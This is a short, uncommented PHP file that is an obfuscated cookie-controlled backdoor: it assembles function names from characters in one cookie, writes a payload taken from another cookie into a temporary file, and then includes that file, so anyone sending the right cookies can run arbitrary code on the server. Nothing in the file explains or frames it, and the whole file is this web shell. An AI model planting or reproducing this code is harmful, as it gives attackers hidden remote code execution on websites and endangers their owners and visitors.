<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[12])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[12][$n];
        if (!$c[12][$n + 1]) {
            if (!$c[12][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[15]() . $p[13];
    if (!$p[29]($k)) {
        $n = $p[22]($k, $p[18]);
        $p[1]($n, $p[23] . $p[14]($p[25]($c[3])));
    }
    include($k);
}